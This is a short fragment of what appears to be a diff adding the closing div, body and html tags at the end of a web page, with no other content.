+</div>
+
+
+
+</body>
+</html>
